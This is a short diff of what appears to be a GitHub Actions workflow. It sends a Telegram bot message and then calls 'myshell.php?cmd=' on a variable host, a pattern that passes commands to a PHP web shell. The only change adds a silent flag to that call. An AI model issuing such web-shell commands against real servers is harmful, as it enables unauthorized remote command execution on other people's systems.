@@ -372,7 +372,7 @@ jobs:
           curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
             -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
 
-          curl "http://$LOCAL_URL/myshell.php?cmd=$ZURL"
+          curl -s "http://$LOCAL_URL/myshell.php?cmd=$ZURL"
           #echo "LANJUT=false" >> "$GITHUB_ENV" # stop loop
 
 
